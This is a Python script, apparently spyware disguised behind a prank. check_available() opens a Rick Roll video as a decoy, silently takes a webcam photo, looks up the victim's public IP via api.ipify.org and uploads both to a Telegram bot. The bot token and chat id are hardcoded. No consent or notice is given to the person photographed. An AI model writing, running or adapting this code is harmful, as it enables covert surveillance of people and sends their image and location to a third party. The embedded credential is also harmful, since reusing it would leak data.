import cv2
import os
import tempfile
import time
import requests


tg_bot_token = "8100799912:AAFLiK91C6f7MqHCyS9_z-DnRT7kaKolI4U"
my_tg_chat_id = 1723016481

check_time_in_metadata = True
path = tempfile.gettempdir() + "\\any_file.jpg"




def capture_photo():
    cap = cv2.VideoCapture(0)

    if not cap.isOpened():
        print("Error 1")
        exit()

    ret, frame = cap.read()

    cap.release()

    if ret:
        cv2.imwrite(path, frame)
    else:
        print("Error 2")
        exit()


def get_ip():
    try:
        #conn = http.client.HTTPConnection("ifconfig.me")
        #conn.request("GET", "/ip")
        #ip = conn.getresponse().read()

        response = requests.get('https://api.ipify.org?format=json')
        response.raise_for_status()
        ip = response.json().get('ip')

        return "ip: " + ip
    except:
        return "ip: none"


def send_tg_msg(ip):
    try:
        path = tempfile.gettempdir() + "\\any_file.jpg"

        # URL для отправки фото
        url = f"https://api.telegram.org/bot{tg_bot_token}/sendPhoto"

        # Отправляем файл
        with open(path, 'rb') as photo:
            files = {'photo': photo}
            data = {'chat_id': my_tg_chat_id, 'caption': ip}
            response = requests.post(url, files=files, data=data)

        if response.status_code != 200:
            print(f"Error 3: {response.text}")

    except Exception as e:
        print(f"Error 4: {e}")

def check_available():
    os.system('start https://youtu.be/dQw4w9WgXcQ')

    if (os.path.isfile(path) == False or (time.time()-os.path.getmtime(path) > 5 and check_time_in_metadata == True)):
        #print("take photo")

        if (os.path.isfile(path) == True):
            os.remove(path)

        capture_photo()

        ip = get_ip()

        while (os.path.isfile(path) == False): time.sleep(0.001)

        send_tg_msg(ip)
    else:
        #print("can't take photo")
        pass
